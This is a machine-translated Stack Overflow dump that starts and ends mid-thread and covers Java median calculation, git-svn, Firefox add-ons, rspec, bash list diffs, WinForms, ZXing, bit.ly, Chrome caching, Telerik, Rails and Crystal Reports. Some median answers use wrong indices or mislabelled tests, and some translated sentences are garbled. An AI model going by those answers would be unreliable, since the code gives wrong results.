> 时间：2017-11-11T21:02:18.327

```
Arrays.sort(numArray);
return (numArray[size/2] + numArray[(size-1)/2]) / 2; 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-08-14T15:38:13.567

```
Arrays.sort(numArray);
int middle = ((numArray.length) / 2);
if(numArray.length % 2 == 0){
 int medianA = numArray[middle];
 int medianB = numArray[middle-1];
 median = (medianA + medianB) / 2;
} else{
 median = numArray[middle + 1];
} 
```

编辑：我最初`medianB`设置为`middle+1`偶数长度数组，这是错误的，因为数组从 0 开始计数。我已经更新它以使用`middle-1`正确的，并且应该适用于偶数长度的数组。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2018-05-28T16:30:28.147

[您可以在https://www.youtube.com/watch?time_continue=23&v=VmogG01IjYc](https://www.youtube.com/watch?time_continue=23&v=VmogG01IjYc)找到很好的解释

它使用 2 个堆的想法，即一个最大堆和平均堆。

```
class Heap {
private Queue<Integer> low = new PriorityQueue<>(Comparator.reverseOrder());
private Queue<Integer> high = new PriorityQueue<>();

public void add(int number) {
    Queue<Integer> target = low.size() <= high.size() ? low : high;
    target.add(number);
    balance();
}

private void balance() {
    while(!low.isEmpty() && !high.isEmpty() && low.peek() > high.peek()) {
        Integer lowHead= low.poll();
        Integer highHead = high.poll();
        low.add(highHead);
        high.add(lowHead);
    }
}

public double median() {
    if(low.isEmpty() && high.isEmpty()) {
        throw new IllegalStateException("Heap is empty");
    } else {
        return low.size() == high.size() ? (low.peek() + high.peek()) / 2.0 : low.peek();
    }
} 
```

}

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-08-14T15:31:54.953

尝试先对数组进行排序。然后排序后，如果数组有偶数个元素，中间两个的平均值是中位数，如果它有奇数个，中间元素是中位数。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-05-19T16:34:59.290

使用[`Arrays.sort`](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html#sort%28long%5B%5D%29)然后取中间元素（如果`n`数组中的元素数量是奇数）或取两个中间元素的平均值（如果`n`是偶数）。

```
 public static long median(long[] l)
  {
    Arrays.sort(l);
    int middle = l.length / 2;
    if (l.length % 2 == 0)
    {
      long left = l[middle - 1];
      long right = l[middle];
      return (left + right) / 2;
    }
    else
    {
      return l[middle];
    }
  } 
```

这里有些例子：

```
 @Test
  public void evenTest()
  {
    long[] l = {
        5, 6, 1, 3, 2
    };
    Assert.assertEquals((3 + 4) / 2, median(l));
  }

  @Test
  public oddTest()
  {
    long[] l = {
        5, 1, 3, 2, 4
    };
    Assert.assertEquals(3, median(l));
  } 
```

如果您的输入是 a `Collection`，您可以使用[Google Guava](http://code.google.com/p/guava-libraries/)执行以下操作：

```
public static long median(Collection<Long> numbers)
{
  return median(Longs.toArray(numbers)); // requires import com.google.common.primitives.Longs;
} 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2016-11-19T22:03:03.817

我正在研究相同的统计问题。你认为的方法很好，它会奏效。（排序的答案已经给出）

但是，如果您对算法性能感兴趣，我认为有几种算法比仅对数组进行排序具有更好的性能，@bruce-feist 的回答指出了一个（[QuickSelect](https://en.wikipedia.org/wiki/Quickselect)）并且得到了很好的解释。

【Java实现：[https](https://discuss.leetcode.com/topic/14611/java-quick-select) ://discuss.leetcode.com/topic/14611/java-quick-select 】

但是这个算法有一个变体，叫做[中位数的中位数](https://en.wikipedia.org/wiki/Median_of_medians)，你可以在这个链接上找到一个很好的解释：http: [//austinrochford.com/posts/2013-10-28-median-of-medians.html](http://austinrochford.com/posts/2013-10-28-median-of-medians.html)

Java 实现： - [https://stackoverflow.com/a/27719796/957979](https://stackoverflow.com/a/27719796/957979)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2016-05-28T11:35:56.867

我昨天遇到了类似的问题。我用 Java 泛型编写了一个方法来计算每个数字集合的中值；您可以将我的方法应用于 Doubles、Integers、Floats 的集合并返回一个 double。请考虑我的方法会创建另一个集合，以免更改原始集合。我还提供了一个测试，玩得开心。;-)

```
public static <T extends Number & Comparable<T>> double median(Collection<T> numbers){
    if(numbers.isEmpty()){
        throw new IllegalArgumentException("Cannot compute median on empty collection of numbers");
    }
    List<T> numbersList = new ArrayList<>(numbers);
    Collections.sort(numbersList);
    int middle = numbersList.size()/2;
    if(numbersList.size() % 2 == 0){
        return 0.5 * (numbersList.get(middle).doubleValue() + numbersList.get(middle-1).doubleValue());
    } else {
        return numbersList.get(middle).doubleValue();
    }

} 
```

JUnit 测试代码片段：

```
/**
 * Test of median method, of class Utils.
 */
@Test
public void testMedian() {
    System.out.println("median");
    Double expResult = 3.0;
    Double result = Utils.median(Arrays.asList(3.0,2.0,1.0,9.0,13.0));
    assertEquals(expResult, result);
    expResult = 3.5;
    result = Utils.median(Arrays.asList(3.0,2.0,1.0,9.0,4.0,13.0));
    assertEquals(expResult, result);
} 
```

使用示例（考虑类名是 Utils）：

```
List<Integer> intValues = ... //omitted init
Set<Float> floatValues = ... //omitted init
.....
double intListMedian = Utils.median(intValues);
double floatSetMedian = Utils.median(floatValues); 
```

[注意：我的方法适用于集合，您可以将数字数组转换为此处](https://stackoverflow.com/questions/2607289/converting-array-to-list-in-java)指出的数字列表

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2018-11-12T13:50:02.253

当列表仅包含一个元素（list.size == 1）时，没有人注意。您的所有答案都会因索引超出范围异常而崩溃，因为整数除法返回零（1 / 2 = 0）。正确答案（在 Kotlin 中）：

```
MEDIAN("MEDIAN") {

        override fun calculate(values: List<BigDecimal>): BigDecimal? {
            if (values.size == 1) {
                return values.first()
            }
            if (values.size > 1) {
                val valuesSorted = values.sorted()
                val mid = valuesSorted.size / 2
                return if (valuesSorted.size % 2 != 0) {
                    valuesSorted[mid]
                } else {
                    AVERAGE.calculate(listOf(valuesSorted[mid - 1], valuesSorted[mid]))
                }
            }
            return null
        }
    }, 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2019-06-03T07:21:37.783

正如@Bruce-Feist 提到的，对于大量元素，如果您关心性能，我会避免任何涉及排序的解决方案。与其他答案中建议的方法不同的方法是 Hoare 的算法，用于查找 n 项的第 k 个最小元素。该算法在 O(n) 中运行。

```
public int findKthSmallest(int[] array, int k)
{
    if (array.length < 10)
    {
        Arrays.sort(array);
        return array[k];
    }
    int start = 0;
    int end = array.length - 1;
    int x, temp;
    int i, j;
    while (start < end)
    {
        x = array[k];
        i = start;
        j = end;
        do
        {
            while (array[i] < x)
                i++;
            while (x < array[j])
                j--;
            if (i <= j)
            {
                temp = array[i];
                array[i] = array[j];
                array[j] = temp;
                i++;
                j--;
            }
        } while (i <= j);
        if (j < k)
            start = i;
        if (k < i)
            end = j;
    }
    return array[k];
} 
```

并找到中位数：

```
public int median(int[] array)
{
    int length = array.length;
    if ((length & 1) == 0) // even
        return (findKthSmallest(array, array.length / 2) + findKthSmallest(array, array.length / 2 + 1)) / 2;
    else // odd
        return findKthSmallest(array, array.length / 2);
} 
```

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2021-01-20T15:49:32.860

```
public static int median(int[] arr) {
int median = 0;
java.util.Arrays.sort(arr);

for (int i=0;i<arr.length;i++) {

    if (arr.length % 2 == 1) {
        median = Math.round(arr[arr.length/2]);
    } else {
        median = (arr[(arr.length/2)] + arr[(arr.length/2)-1])/2;
    }
}
return median; 
```

}

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2012-08-14T15:32:36.200

查看 Arrays.sort 方法：

[http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html)

您还应该真正将查找中位数抽象到它自己的方法中，然后将值返回给调用方法。这将使测试您的代码更加容易。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2016-01-25T16:33:21.603

```
public int[] data={31, 29, 47, 48, 23, 30, 21
        , 40, 23, 39, 47, 47, 42, 44, 23, 26, 44, 32, 20, 40};

public double median()
    {
        Arrays.sort(this.data);
        double result=0;
        int size=this.data.length;

        if(size%2==1)
        {
            result=data[((size-1)/2)+1];
            System.out.println(" uneven size : "+result);
        }
        else
        { 
            int middle_pair_first_index =(size-1)/2;
            result=(data[middle_pair_first_index+1]+data[middle_pair_first_index])/2;
            System.out.println(" Even size : "+result);
        }

        return result;
    } 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-09-17T16:49:37.920

```
package arrays;

public class Arraymidleelement {

    static public double middleArrayElement(int []  arr)
    {
     double  mid;
        if(arr.length%2==0)
        {
            mid=((double)arr[arr.length/2]+(double)arr[arr.length/2-1])/2;
            return mid;
        }

        return arr[arr.length/2];

    }
    public static void main(String[] args) {
        int arr[]= {1,2,3,4,5,6};

        System.out.println( middleArrayElement(arr));

    }

} 
```

# git - git-svn：如何知道 git-svn 工作副本的当前 SVN 版本？

> ID：11955730
> 
> 赞同：3
> 
> 时间：2012-08-14T15:28:32.387
> 
> 标签：git, svn, git-svn

我有一个 git-svn 工作副本，而 git log 没有给我提供关于我正在使用哪个 SVN 修订版的直接信息。我知道，一旦我重新设置基准，我应该将所有上游日志转换为 git log，但这似乎仍然没有给我一个 REVISION NUMBER，我必须进行文本挖掘才能找到答案。

我缺少一个简单的命令吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:33:59.587

它显示在每个提交消息的底部。有一个类似这样的日志行：

```
git-svn-id: http://svn.example.com/trunk/whatever@12345 [git-svn remote hash] 
```

那`12345`就是提交的 SVN 版本

# javascript - 如何使用语言设置的语言环境文件和带有附加构建器的选项窗口的简单首选项

> ID：11955731
> 
> 赞同：1
> 
> 时间：2012-08-14T15:28:33.837
> 
> 标签：javascript, firefox-addon, firefox-addon-sdk

我正在使用 Mozilla Add-on Builder 开发一个插件。有3个问题我找不到解决方案：

1.  为了能够提供与用户相关的语言，我必须将属性文件添加到语言环境文件 - 即 en-US.properties。但是如何使用 Add-on Builder 来实现呢？我可以使用 ln10 模块，但我不知道如何创建属性文件，因为（对我而言）唯一可见的文件夹是`lib`,`data`和`libraries`- 而不是`locale`.

2.  当我在附加组件管理器中单击“选项”时，我安装的其他扩展会打开一个小的首选项窗口。但是当我使用该模块时`simple-prefs`，首选项显示在与单击“更多”时显示的所有其他信息相同的站点上。如何为我的偏好设置一个单独的小“窗口”？除了斯巴达式的“类型”-“价值”-thingy，我还有其他选择吗？

3.  我知道如何使用 Erik Vold 的`toolbarbutton`模块，但是当我单击工具栏图标或菜单中的“选项”（如其他扩展程序）时，我如何才能实现如此漂亮的选项窗口？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T16:53:04.327

我想首先摆脱基本的误解。Firefox 扩展有两种截然不同的类型：经典的基于 XUL 的扩展和基于附加 SDK 的扩展。Add-on Builder 与后者一起使用，几乎所有[MDN](http://developer.mozilla.org/)上的扩展文档都适用于前者。

> 我可以使用 ln10 模块，但我不知道如何创建属性文件，因为（对我而言）唯一可见的文件夹是 lib、data 和 library - 而不是 locale。

附加组件生成器似乎还不支持本地化附加组件。您可以[下载附加 SDK](https://addons.mozilla.org/en-us/developers/builder)并从命令行构建您的扩展 - 这将为您提供更多选择。

> 当我在附加组件管理器中单击“选项”时，我安装的其他扩展会打开一个小的首选项窗口。

这些是基于 XUL 的扩展。Add-on SDK 不支持打开新窗口，仅支持[面板](https://addons.mozilla.org/en-US/developers/docs/sdk/1.9/packages/addon-kit/panel.html)。然而，即使为附加选项打开一个面板也需要一些非常有创意的黑客攻击。

> 当我单击工具栏图标或菜单中的“选项”（如其他扩展程序）上的“选项”时，如何实现这样的漂亮选项窗口？

这里也一样 - 附加 SDK 支持基于 HTML 的面板，没有真正的（基于 XUL 的）应用程序窗口。

# ruby - rspec2中类的`stub`

> ID：11955733
> 
> 赞同：2
> 
> 时间：2012-08-14T15:28:44.093
> 
> 标签：ruby, rspec

```
describe SomeThing do
  before :all do
    # ...
    FooClass.stub(:fooMethod).with('a').and_return("something")
  end
end 
```

工作很酷`rspec 1`。

我已经更新到`rspec 2`，这就是我现在收到的这条线路：

```
Failure/Error: 
   FooClass.stub(:fooMethod).with('a').and_return("something")
     NoMethodError:
       undefined method `stub' for FooClass::Class 
```

[rspec api](http://rubydoc.info/gems/rspec-mocks/frames)但是说：`Person.stub(:find) { person }`

我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:42:14.407

这是在一个`it`或`before`块内吗？

块中不支持存根`before :all`。在每个示例之后，存根和模拟都会被清除。[您可以在此处](http://github.com/rspec/rspec-mocks/issues/92)阅读有关此内容的更多信息。更改`before :all do`为`before do`，这应该可以。

# bash - 使用 bash 或 DOS 查找两个列表之间的不匹配项

> ID：11955734
> 
> 赞同：2
> 
> 时间：2012-08-14T15:28:44.140
> 
> 标签：bash, batch-file

我有两个带有两个单列表的文件：

//file1 - 唯一值的完整列表
AAA
BBB
CCC

//file2
AAA
AAA
BBB
BBB

//所以这里的结果是：
CCC

我需要从 file1 中生成一个在 file2 中没有匹配项的值列表。我必须使用 bash 脚本（最好没有 awk 等特殊工具）或 DOS 批处理文件。

谢谢你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:32:18.277

# 方法一

看起来像是`grep`-v 标志的工作。

```
grep -v -F -f  listtocheck uniques 
```

# 方法二

Drake Clarris 的解决方案的一个变体（可以扩展到使用多个文件进行检查，`grep`除非它们首先合并，否则无法做到），将是：

```
(
    sort < file_to_check | uniq
    cat reference_file reference_file
) | sort | uniq -u 
```

通过这样做，in 中的任何单词都`file_to_check`将出现在由括号中的子shell 组合的输出中，仅出现一次。单词 in`reference_file`将*至少输出两次*，并且出现在*两个*文件中的单词将至少输出 3 次——一个来自第一个文件，两次来自第二个文件的两个副本。

只剩下找到一种方法来隔离我们想要的单词，那些出现一次的单词，这就是`sort | uniq -u`它的作用。

# 优化一

如果`reference_file`包含*很多*重复项，则可能值得运行更重的

```
sort < reference_file | uniq
sort < reference_file | uniq 
```

取而代之的是`cat reference_file reference_file`，为了有更小的输出和更轻的最终重量`sort`。

# 优化二

如果我们使用临时文件，这会更快，因为合并已经排序的文件可以有效地完成（并且在重复检查不同文件的情况下，我们可以一次又一次地重复使用相同的排序参考文件，而无需重新排序它); 所以

```
sort < file_to_check  | uniq > .tmp.1
sort < reference_file | uniq > .tmp.2
# "--merge" works way faster, provided we're sure the input files are sorted
sort --merge .tmp.1 .tmp.2 .tmp.2 | uniq -u
rm -f .tmp.1 .tmp.2 
```

# 优化三

最后，如果在一个文件中运行很长时间的相同行，例如某些日志记录系统可能就是这种情况，运行两次可能也是值得的`uniq`，一次摆脱运行（*ahem*），另一次使其唯一化，因为在线性时间中工作，而[线性](http://en.wikipedia.org/wiki/Time_complexity)`uniq`时间。`sort`

```
uniq < file | sort | uniq > .tmp.1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T16:02:22.327

对于 Windows CMD 解决方案（通常称为 DOS，但实际上并非如此）：

它应该像这样简单

```
findstr /vlxg:"file2" "file1" 
```

但是有一个[findstr 错误](https://stackoverflow.com/questions/8921253/why-doesnt-this-findstr-example-with-multiple-literal-search-strings-find-a-mat)，当有多个文字搜索字符串时，可能会丢失匹配项。

如果可以接受不区分大小写的搜索，则添加该`/I`选项可以绕过该错误。

```
findstr /vlixg:"file2" "file1" 
```

如果您不限于本机 Windows 命令，则可以下载适用于 Windows 的 grep 等实用程序。用于 Windows 的 Gnu 实用程序是一个很好的来源。然后你可以在 Windows 和 'nix 上使用 Isemi 的解决方案。

为 Windows 编写 VBScript 或 JScript 解决方案也很容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T16:03:25.253

```
cat file1 file2 | sort | uniq -u 
```

# winforms - 在绑定到集合的 datagridview 中设置组合框

> ID：11955743
> 
> 赞同：2
> 
> 时间：2012-08-14T15:29:00.990
> 
> 标签：winforms, collections, datagridview, combobox

我有一个问题希望有人能帮助我。我的问题涉及 Visual Studio 2008 中的 winforms 和 datagridview。我想将我的 datagridview 绑定到业务对象集合而不是数据集。我想在 datagridview 中有组合框，它从业务对象中的属性之一获取其值。这可能吗？有人可以提供示例代码或提供描述如何执行此操作的网页。任何帮助，将不胜感激。

谢谢，格雷格

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T21:25:22.653

这是一个简单的数据类：

```
Public Class MyData

  Private _ID As Integer
  Private _ItemValue As String

  Public Sub New(ByVal id As Integer, ByVal itemValue As String)
    _ID = id
    _ItemValue = itemValue
  End Sub

  ReadOnly Property ID() As Integer
    Get
      Return _ID
    End Get
  End Property

  Public Property ItemValue() As String
    Get
      Return _ItemValue
    End Get
    Set(ByVal value As String)
      _ItemValue = value
    End Set
  End Property

End Class 
```

创建一个窗体并在其上放置一个 DataGridView 控件，添加以下代码：

```
Private myList As New List(Of String)
Private myItems As New List(Of MyData)

Protected Overrides Sub OnLoad(ByVal e As EventArgs)
  MyBase.OnLoad(e)

  myList.Add("First Item")
  myList.Add("Last Item")

  myItems.Add(New MyData(1, "Last Item"))
  myItems.Add(New MyData(2, "First Item"))

  DataGridView1.AutoGenerateColumns = False
  DataGridView1.Columns.Add(New DataGridViewTextBoxColumn() With _
                           {.HeaderText = "ID", _
                            .DataPropertyName = "ID"})
  DataGridView1.Columns.Add(New DataGridViewComboBoxColumn() With _
                           {.HeaderText = "ItemValue", _
                            .DataSource = myList, _
                            .DataPropertyName = "ItemValue"})

  DataGridView1.DataSource = myItems
End Sub 
```

由于您想要在网格中使用组合框，因此您必须设置`AutoGenerateColumns`为 false 并自己创建它们，通过属性将每一列映射到类中的`DataPropertyName`属性。`DataSource`对于组合框，您可以为下拉项目列表设置自己的。

# ios - iOS ZXingWidget - 在自己的 ViewController.view 中使用 ZXingWidgetViewController 的视图作为子视图

> ID：11955753
> 
> 赞同：2
> 
> 时间：2012-08-14T15:29:20.773
> 
> 标签：ios, uiviewcontroller, subview, zxing, addsubview

我正在尝试使用 iOS zxing 小部件进行 QR 码扫描。我有一个 ViewController，它作为我的 UINavigationController 中的项目推送或从另一个 ViewController 模态呈现。这个 ViewController 有一个 SegmentedControl 用于 3 个不同的视图。其中两个视图是加载简单网站的 UIWebView，它们没有什么特别之处。

选择看起来像这样：

```
- (IBAction)segmentedControlValueChanged:(id)sender {
    NSString *urlString;
    ZXingWidgetController *widController;
    QRCodeReader* qrcodeReader;
    NSSet *readers;
    switch (segmentedControl.selectedSegmentIndex) {
        case 0:
            [self.view bringSubviewToFront:self.productSearchWebView];
            urlString = [[SACommunicationService sharedCommunicationService] getURLforKey:kURLTypeProductSearch];
            [self.productSearchWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlString]]];
            break;
        case 1:
            [self.view bringSubviewToFront:self.marketSearchWebView];
            urlString = [[SACommunicationService sharedCommunicationService] getURLforKey:kURLTypeMarketSearch];
            [self.marketSearchWebView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlString]]];
            break;
        case 2:
            widController = [[ZXingWidgetController alloc] initWithDelegate:self showCancel:YES OneDMode:NO];
            qrcodeReader = [[QRCodeReader alloc] init];
            readers = [[NSSet alloc] initWithObjects:qrcodeReader,nil];
            widController.readers = readers;
            [self.QRCodeScannerView addSubview:widController.view];
            [self.view bringSubviewToFront:self.QRCodeScannerView];
            break;
        default:
            break;
    }
} 
```

我尝试调试并一步一步地找出问题出在哪里：

解码器（它是底层 ZXing 逻辑的一部分）尝试从其委托（应该是 ZXingWidgetController 类）调用“failedToDecodeImage:”并崩溃（EXC_BAD_ACCESS）

在逐步完成时，我发现 ZXingWidgetController 的“取消”方法被调用。现在我真的不知道为什么会调用这个方法。Widget 不应在初始化和启动解码器后立即停止。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-24T13:09:27.507

所以答案很简单。

我使用的是 iOS 5.0 和 ARC。ZXing ViewController 在方法内部本地实例化。由于 ViewController 本身没有被查看，ARC 在方法结束时设置了一个释放，并且 ViewController 被释放。由于 ViewController 被释放，被 ViewController 保留的视图也将被释放。调用 Canceled 是因为 Main ViewController 不再存在，并且在 nil 指针上调用某些方法会导致 BAD_ACCESS。

这里的解决方案是将 ZXingViewController 设置为全局强属性。这可以防止对象在该方法结束时立即释放，因此只要 ViewController 处于活动状态，作为子视图添加到另一个 ViewControllers 视图的视图就会保存在内存中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T20:07:08.450

您不应该将控制器视图添加为另一个视图的子视图。您应该使用各种`UIViewController`机制来呈现控制器。

通过做你正在做的事情，你违反了`UIViewController`合同。小部件没有得到诸如`viewWillAppear`,之类的东西`viewDidAppear`。

如果你想在`UIView`/`CALayer`级别而不是级别使用 ZXing `UIViewController`，请查看[ZXing objc 目录](https://code.google.com/p/zxing/source/browse/trunk/objc)中的类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-02T20:45:40.477

试试这个......也在.h文件中制作这个 ZXingWidgetController *widController; 并且还对 viewScanner 设置 clipToBounds 为 true。

```
 -(void)viewDidAppear:(BOOL)animated
    {
        [super viewDidAppear:animated];

        [self performSelector:@selector(openScanner) withObject:nil afterDelay:0.5];
    }

    -(void)openScanner
    {
        self.widController = [[ZXingWidgetController alloc] initMiniWithDelegate:self showCancel:NO OneDMode:YES];

        NSMutableSet *readers = [[NSMutableSet alloc ] init];

        MultiFormatReader* reader = [[MultiFormatReader alloc] init];
        [readers addObject:reader];

        self.widController.readers = readers;

        [viewScanner addSubview:self.widController.view];
    } 
```

# javascript - 将 URL 中的参数附加到输入字段 javascript 的值中

> ID：11955756
> 
> 赞同：0
> 
> 时间：2012-08-14T15:29:27.883
> 
> 标签：javascript, bookmarklet, bit.ly

我正在尝试使用 javascript 来修改页面上的 url。该 URL 然后被传递到 bit.ly 小书签中以缩短。我的脚本会将参数附加到 URL 并将其插入到 bit.ly 小书签的 URL 字段中。如果这可行，我会将 bit.ly 小书签的代码与脚本结合起来以自动执行其任务。

**过程如下：**

运行 bit.ly 小书签，运行我的脚本来附加参数，使用 bit.ly 小书签

**bit.ly 小书签的来源**

```
<div id="mainUnAuthShortenContainer" class="inputBoxContainer">
<input tabindex="1" id="shortenUnAuthContainer" name="url" value="https://www.google.com/" type="text">
</div> 
```

**我的剧本**

```
var elem = document.getElementById("shortenUnAuthContainer");
elem.value = window.location + "?Parameter"; 
```

我的脚本适用于[JSFiddle](http://jsfiddle.net/UDvQg/1/)，但不适用于实际应用程序。当应用于实际的 bit.ly 小书签时，它什么也不做。任何帮助表示赞赏。

[bit.ly 小书签](http://stoweboyd.com/post/24016133743/the-original-bitly-javascript-bookmarklet)供参考。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T15:10:31.600

不可能。

原因：浏览器拒绝访问 iframe 中的元素（内部 iframe 的 URL 与父窗口不同）被浏览器拒绝。

更多：您正在尝试访问尚未创建的元素，此时 JS/iframe/element 仍在加载中。如果你解决了这个问题，那么你仍然会遇到上面的限制..

*我检查了 bitly API 文档，如果您有 PHP 服务器，可能会有一个解决方案 - 部署您自己的 bitly 服务：[https ://code.google.com/p/bitly/](https://code.google.com/p/bitly/)

仅供参考，位代码库：[http ://dev.bitly.com/code_libraries.html](http://dev.bitly.com/code_libraries.html)

# javascript - 如何强制 Chrome 停止获取相同的图像？

> ID：11955758
> 
> 赞同：1
> 
> 时间：2012-08-14T15:29:34.657
> 
> 标签：javascript, image, google-chrome, caching

当用户将鼠标悬停在屏幕的特定区域时，我创建一个 div，然后设置背景：

```
div= document.createElement('div');

if (yellowBg) {
    div.style.backgroundImage = 'url(\'../partHoverBgYellow.png\')';
}
else {
    div.style.backgroundImage = 'url(\'../partHoverBg.png\')';
}

parent.appendChild(div) 
```

在 Firefox 和 IE 中，背景图像在第一次获取后会被缓存。

但是在chrome中，它似乎没有被缓存。结果是 div 在每次设置其背景之前出现。

我已经使用 Fiddler 进行了检查，并且确实每次都获取了图像。

有什么办法可以防止这种情况发生吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T08:17:13.593

您可以尝试使用 css 设置背景，并且只更改代码中的 className。[这个 jsfiddle](http://jsfiddle.net/FrGxw/)展示了这样做的想法。在 Chrome 开发人员工具的网络选项卡中，您会看到初始加载后的图像随后从缓存中加载。

代码变得如此简单：`div.className = yellowBG ? 'yellowBG' : '';`

在[这个 jsfiddle](http://jsfiddle.net/6BBak/)中，图像是预加载的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T17:16:58.377

如果您可以控制从服务器发送的标头，请包括以下内容：

```
Cache-control: public; max-age=31536000 
```

因此，您的图像会在客户端缓存一年。这是每个浏览器都必须实现的方式和语义。有关进一步说明，请参阅[W3C 文档](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.9)。

此外，请务必注意，此标头将禁止您更新上述图像。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:59:47.130

见[http://jsfiddle.net/X8SkS/3/](http://jsfiddle.net/X8SkS/3/)

如果你这样做

```
var img=document.createElement('img');
var urls=["../partHoverBgYellow.png","../partHoverBg.png"];
img.src=urls[0];
img.src=urls[1]; 
```

当文档加载时，浏览器会下载图片，所以当你这样做的时候

```
div.style.display = 'block'; 
```

Chrome 会将图片保存在缓存中，`div`并且其背景将同时出现。

# telerik - 我可以在生产应用程序中使用 Telerik Metro Controls Beta 吗？

> ID：11955759
> 
> 赞同：0
> 
> 时间：2012-08-14T15:29:35.343
> 
> 标签：telerik, wpf-controls, custom-controls, microsoft-metro, beta

到目前为止，他们是我能找到的唯一正在做图表控制的人......

测试版到期后会发生什么？它如何过期？（它会过期吗？）。它们看起来很棒，但没有定价信息或到期信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-16T14:23:46.880

以下是 EULA 的直接引用：

“您只能根据符合本节要求的最终用户许可，将 **嵌入在您的集成产品中**的程序**分发给您的最终用户。”</p>**

**所以，是的，您可以将使用 Telerik Windows 8 Controls Beta 构建的应用程序发布到应用商店。**

 *** * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-14T23:36:08.847

根据定义，“Beta”表示尚未准备好用于生产用途。

在继续之前，您至少应该考虑几件事：

1.  控件的许可协议是否允许在生产应用程序中使用（您确实阅读了许可，对吗？）
2.  您是否愿意冒这个应用程序可能突然停止为所有已下载它的用户工作的风险，直到您将控件替换为工作版本（并将应用程序的更新版本提交到商店）？

只要控件适合 Windows 8 应用程序设计，并且不会导致性能或崩溃问题，它们可能不会对应用程序是否通过认证产生任何影响。

但更大的问题是风险之一。Beta 用于测试。IMO，除非测试版包含“上线”许可证，否则您可能应该坚持仅使用测试版软件进行评估和测试。

需要明确的是，这并没有影响 Telerik 的测试版质量（或其他任何人的测试版质量）。只是提醒一下，测试版软件尚未完成。**

# ruby-on-rails - 视图中的 ruby on rails 未定义方法“用户名”

> ID：11955762
> 
> 赞同：0
> 
> 时间：2012-08-14T15:29:44.000
> 
> 标签：ruby-on-rails, activerecord, undefined

```
users_controller.rb

class UsersController < ApplicationController
    def index
        render_404
    end

    def show
        @user = User.where(:username => params[:username])

        render_404 if !@user
    end
end 
```

基本上我想根据用户名获取每个用户数据，因为稍后我想再包含一个表，其中包含每个用户的元数据，但我不断收到以下错误

```
undefined method `username' for #<ActiveRecord::Relation:0x007fb5dbc52ea0>

Extracted source (around line #1):

1: <%= @user.username %> profile page 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:42:11.047

`@user = User.where(:username => params[:username]).first`试试这个或`@user = User.find_by_username(params[:username])`。`Where`返回`AR::Relation`，而不是 ActiveRecord 对象。

# crystal-reports - 水晶公式循环仅返回最后一条记录

> ID：11955766
> 
> 赞同：0
> 
> 时间：2012-08-14T15:30:02.240
> 
> 标签：crystal-reports, concatenation, formula

使用水晶十一

我有两个数组 - 一个捕获时间点列表，另一个捕获与它们关联的时间。

我需要将两者关联起来，以便输出看起来像

> ```
> timepoint[1] - time [1]  - timepoint[2] - timepoint[2]; 
> 
> timepoint[3] - time[3]  -  timepoint[4] - timepoint[4]; 
> ```

所以我写了以下代码 - 数组在标题中初始化，然后在详细信息部分加载数据，然后显示在组页脚中（三个公式技巧）。我可以分别显示两个数组中的数据

> `(as timepoint[1], timepoint[2], etc)`

只有在尝试将两者结合起来时才会出现这个问题。下面的代码只打印数组中的最后两条记录，而不是所有记录。所以如果有 5 个时间点和 5 次下面的代码显示

> 时间点[4]-时间[4] - 时间点[5]-时间[5]

我最终将不得不在两个关联的日期时间之间执行计算，但现在只是试图让关联和显示工作。

```
Shared stringVar array Timepoints;
Shared DateTimeVar array Times;
local stringVar combineStr;
local numbervar i;

For i:=1 to UBound(Times)-2 do   
(combineStr := Timepoints[i] + ','+ totext(Times[i]) + '-' + 
Timepoints[i+1] + totext(Times[i+1]) + ',');
 combineStr; 
```

谢谢你看这个

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:50:26.167

每次迭代都会覆盖 combineStr 变量的先前值。你需要这样做：

```
.
.
.
For i:=1 to UBound(Times)-2 do   
(combineStr := combineStr + Timepoints[i] + ','+ totext(Times[i]) + '-' + 
Timepoints[i+1] + totext(Times[i+1]) + ',');

combineStr;
```

其他一些事情： 1\. 您需要连接换行符 chr(10)，而不是迭代之间的逗号，以便像问题中的示例一样显示。2\. 您需要在 for 循环中添加“步骤 2”，否则您将打印两次时间点。

# asp.net-mvc - LINQ、MVC 3 和实体框架中的搜索排名

> ID：11955769
> 
> 赞同：0
> 
> 时间：2012-08-14T15:30:08.433
> 
> 标签：asp.net-mvc, asp.net-mvc-3, linq

以前在 SQL 中，我会使用这样的东西来对我的搜索结果进行排名：

```
 --search product name
    SELECT tblProduct.ProductID, 20 AS Ranking
